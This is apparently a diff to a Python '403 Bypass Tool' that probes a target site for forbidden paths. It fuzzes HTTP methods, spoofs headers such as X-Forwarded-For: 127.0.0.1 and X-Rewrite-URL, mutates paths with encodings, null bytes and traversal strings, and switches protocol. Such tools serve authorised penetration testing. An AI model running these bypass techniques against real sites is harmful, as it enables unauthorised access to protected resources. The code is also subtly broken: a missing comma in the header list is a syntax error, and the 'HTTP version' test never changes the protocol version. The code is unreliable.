@@ -17,6 +17,18 @@ class colors:
 def random_user_agent():
     return ''.join(random.choices(string.ascii_uppercase, k=7))
 
+# Path Manipulation Techniques
+PATH_MANIPULATION_TECHNIQUES = [
+    "{0}", "%2e/{0}", "%2f{0}/", "%2f{0}%2f", "./{0}/",
+    "{0}/.", "/{0}/./", "/{0}//", "./{0}/./",
+    "{0}?", "{0}.html", "{0}.php", "{0}#",
+    "{0}..;/", "{0};/", "//{0}///", 
+    "{0}/ ".upper(), "*{0}/", "/{0}", "/{0}//",
+    "{0}../", "{0}/*", ";/{0}/", "/;//{0}/",
+    "{0}%00", "{0}/{0}.txt", "{0}."
+]
+
+# Header Bypass Techniques
 BYPASS_HEADERS = [
     {"X-Forwarded-For": "127.0.0.1"},
     {"X-Originating-IP": "127.0.0.1"},
@@ -26,20 +38,15 @@ BYPASS_HEADERS = [
     {"X-ProxyUser-Ip": "127.0.0.1"},
     {"X-Original-URL": ""},
     {"X-Rewrite-URL": ""},
+    {"X-Rewrite-URL": "{path}/login"}
     {"Client-IP": "127.0.0.1"},
+    {"X-Custom-IP-Authorization": "127.0.0.1"},
     {"Host": "localhost"},
     {"X-Forwarded-Host": "127.0.0.1"},
     {"X-Host": "127.0.0.1"},
-    {"X-rewrite-url": "{path}/login"}
 ]
 
 HTTP_METHODS = ["GET", "POST", "PUT", "HEAD", "PATCH", "TRACE"]
-
-PATH_TECHNIQUES = [
-    "{}", "%2e/{}", "%2f{}/", "%2f{}%2f", "./{}/","{}/.", "/{}/./","/{}//", "./{}/./",
-    "{}?", "{}.html", "{}.php", "{}#", "{}..;/", "{};/",
-    "//{}///", "{}/ ".upper(), "*{}/", "/{}", "/{}//", "{}../", "{}/*", ";/{}/", "/;//{}/"
-]
 
 def load_wordlist(wordlist_file):
     try:
@@ -49,13 +56,109 @@ def load_wordlist(wordlist_file):
         print(f"{colors.RED}[!] Wordlist file not found: {wordlist_file}{colors.END}")
         sys.exit(1)
 
-def test_bypass(url, path, headers=None, method="GET", verbose=False):
+def test_protocol_switch(url, path=None, verbose=False):
+    try:
+        base_url = url.rstrip('/')
+        full_url = f"{base_url}/{path}" if path else base_url
+        
+        if full_url.startswith('https://'):
+            new_url = full_url.replace('https://', 'http://')
+            proto = "HTTP"
+        else:
+            new_url = full_url.replace('http://', 'https://')
+            proto = "HTTPS"
+        
+        if verbose:
+            print(f"{colors.BLUE}[*] Testing protocol switch to {proto}{colors.END}")
+        
+        response = requests.get(
+            new_url,
+            headers={"User-Agent": random_user_agent()},
+            timeout=5,
+            allow_redirects=True
+        )
+        
+        if response.status_code in [200, 301, 302, 303, 307, 308]:
+            return True, response.status_code, "GET", None, path if path else "", new_url
+    except Exception as e:
+        if verbose:
+            print(f"{colors.RED}    Error: {e}{colors.END}")
+    return False, 0, None, None, None, None
+
+def test_http_versions(url, path=None, verbose=False):
+    try:
+        base_url = url.rstrip('/')
+        full_url = f"{base_url}/{path}" if path else base_url
+        
+        if verbose:
+            print(f"{colors.BLUE}[*] Testing HTTP/1.0{colors.END}")
+        
+        response = requests.get(
+            full_url,
+            headers={
+                "User-Agent": random_user_agent(),
+                "Connection": "close"
+            },
+            timeout=5,
+            allow_redirects=True
+        )
+        
+        if response.status_code in [200, 301, 302, 303, 307, 308]:
+            return True, response.status_code, "GET", {"HTTP-Version": "1.0"}, path if path else ""
+        
+        if verbose:
+            print(f"{colors.BLUE}[*] Testing HTTP/2{colors.END}")
+        
+        response = requests.get(
+            full_url,
+            headers={"User-Agent": random_user_agent()},
+            timeout=5,
+            allow_redirects=True
+        )
+        
+        if response.status_code in [200, 301, 302, 303, 307, 308]:
+            http_version = "2" if hasattr(response.raw, 'version') and response.raw.version == 11 else "1.1"
+            return True, response.status_code, "GET", {"HTTP-Version": http_version}, path if path else ""
+            
+    except Exception as e:
+        if verbose:
+            print(f"{colors.RED}    Error: {e}{colors.END}")
+    return False, 0, None, None, None
+
+def test_fuzzing(url, path, method="GET", verbose=False):
     try:
         effective_path = f"/{path}" if path else "/"
         full_url = url + effective_path
         
-        final_headers = headers.copy() if headers else {}
-        final_headers["User-Agent"] = random_user_agent()
+        headers = {"User-Agent": random_user_agent()}
+        
+        if verbose:
+            print(f"{colors.BLUE}[*] Testing: {method} {full_url}{colors.END}")
+        
+        response = requests.request(
+            method, 
+            full_url, 
+            headers=headers, 
+            timeout=5,
+            allow_redirects=True
+        )
+        
+        if verbose:
+            print(f"{colors.YELLOW}    Response: {response.status_code}{colors.END}")
+        
+        if response.status_code in [200, 301, 302, 303, 307, 308]:
+            return True, response.status_code, method, headers, effective_path
+    except Exception as e:
+        if verbose:
+            print(f"{colors.RED}    Error: {e}{colors.END}")
+    return False, 0, None, None, None
+
+def test_headers(url, path, headers, verbose=False):
+    try:
+        effective_path = f"/{path}" if path else "/"
+        full_url = url + effective_path
+        
+        final_headers = headers.copy()
         
         # Process headers that might contain {path} placeholder
         for header_name in final_headers:
@@ -69,13 +172,11 @@ def test_bypass(url, path, headers=None, method="GET", verbose=False):
             final_headers["X-Rewrite-URL"] = effective_path.lstrip('/')
         
         if verbose:
-            print(f"{colors.BLUE}[*] Testing: {method} {full_url}", end='')
-            if headers:
-                print(f" with headers: {final_headers}", end='')
+            print(f"{colors.BLUE}[*] Testing HEADERS: GET {full_url}", end='')
+            print(f" with headers: {final_headers}", end='')
             print(colors.END)
         
-        response = requests.request(
-            method, 
+        response = requests.get(
             full_url, 
             headers=final_headers, 
             timeout=5,
@@ -86,7 +187,7 @@ def test_bypass(url, path, headers=None, method="GET", verbose=False):
             print(f"{colors.YELLOW}    Response: {response.status_code}{colors.END}")
         
         if response.status_code in [200, 301, 302, 303, 307, 308]:
-            return True, response.status_code, method, final_headers, effective_path
+            return True, response.status_code, "GET", final_headers, effective_path
     except Exception as e:
         if verbose:
             print(f"{colors.RED}    Error: {e}{colors.END}")
@@ -107,50 +208,82 @@ def print_success(url, status_code, method, headers, path):
 def run_tests(target_url, path, threads=20, verbose=False):
     effective_path = path if path is not None else ""
     
+    # Test protocol switch (HTTP/HTTPS)
+    success, code, method, headers, path, new_url = test_protocol_switch(target_url, effective_path, verbose)
+    if success:
+        print_success(new_url, code, method, headers, "")
+
+    # Test HTTP versions
+    success, code, method, headers, path = test_http_versions(target_url, effective_path, verbose)
+    if success:
+        print_success(target_url, code, method, headers, f"/{path}" if path else "")
+    
+    # Test HTTP Methods
     if verbose:
-        print(f"\n{colors.BOLD}[*] Testing HTTP Methods on /{effective_path}{colors.END}")
+        print(f"\n{colors.BOLD}[*] Testing HTTP Methods{colors.END}")
     
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = []
         for method in HTTP_METHODS:
-            futures.append(executor.submit(test_bypass, target_url, effective_path, None, method, verbose))
+            futures.append(executor.submit(test_fuzzing, target_url, effective_path, method, verbose))
         
         for future in futures:
-            success, code, method, headers, path = future.result()
-            if success:
-                print_success(target_url, code, method, headers, path)
+            try:
+                success, code, method, headers, path = future.result()
+                if success:
+                    print_success(target_url, code, method, headers, path)
+            except Exception as e:
+                if verbose:
+                    print(f"{colors.RED}    Error processing result: {e}{colors.END}")
 
+    # Test Header Bypass Techniques
     if verbose:
-        print(f"\n{colors.BOLD}[*] Testing Headers on /{effective_path}{colors.END}")
+        print(f"\n{colors.BOLD}[*] Testing Header Bypass Techniques{colors.END}")
     
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = []
         for header in BYPASS_HEADERS:
             h = header.copy()
-            futures.append(executor.submit(test_bypass, target_url, effective_path, h, "GET", verbose))
+            futures.append(executor.submit(test_headers, target_url, effective_path, h, verbose))
         
         for future in futures:
-            success, code, _, headers, path = future.result()
-            if success:
-                print_success(target_url, code, "GET", headers, path)
+            try:
+                success, code, _, headers, path = future.result()
+                if success:
+                    print_success(target_url, code, "GET", headers, path)
+            except Exception as e:
+                if verbose:
+                    print(f"{colors.RED}    Error processing result: {e}{colors.END}")
 
+    # Test Path Manipulation Techniques
     if effective_path:
         if verbose:
-            print(f"\n{colors.BOLD}[*] Testing Path Fuzzing{colors.END}")
+            print(f"\n{colors.BOLD}[*] Testing Path Manipulation Techniques{colors.END}")
         
         with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = []
-            for technique in PATH_TECHNIQUES:
-                if technique == "{}/ ".upper():
-                    modified_path = technique.format(effective_path.upper())
-                else:
-                    modified_path = technique.format(effective_path)
-                futures.append(executor.submit(test_bypass, target_url, modified_path, None, "GET", verbose))
+            for technique in PATH_MANIPULATION_TECHNIQUES:
+                try:
+                    if technique == "{0}/ ".upper():
+                        modified_path = technique.format(effective_path.upper())
+                    else:
+                        modified_path = technique.format(effective_path)
+                    if verbose:
+                        print(f"{colors.BLUE}[*] Testing path: {modified_path}{colors.END}")
+                    futures.append(executor.submit(test_fuzzing, target_url, modified_path, "GET", verbose))
+                except (IndexError, KeyError) as e:
+                    if verbose:
+                        print(f"{colors.RED}    Error applying technique {technique}: {e}{colors.END}")
+                    continue
             
             for future in futures:
-                success, code, _, _, path = future.result()
-                if success:
-                    print_success(target_url, code, "GET", None, path)
+                try:
+                    success, code, _, _, path = future.result()
+                    if success:
+                        print_success(target_url, code, "GET", None, path)
+                except Exception as e:
+                    if verbose:
+                        print(f"{colors.RED}    Error processing result: {e}{colors.END}")
 
 def main():
     parser = argparse.ArgumentParser(description='403 Bypass Tool')
@@ -178,7 +311,6 @@ def main():
             run_tests(target_url, path, args.threads, args.verbose)
     else:
         if args.paths:
-            # Split paths by comma and strip whitespace
             paths = [p.strip() for p in args.paths.split(',')]
             for path in paths:
                 if args.verbose:
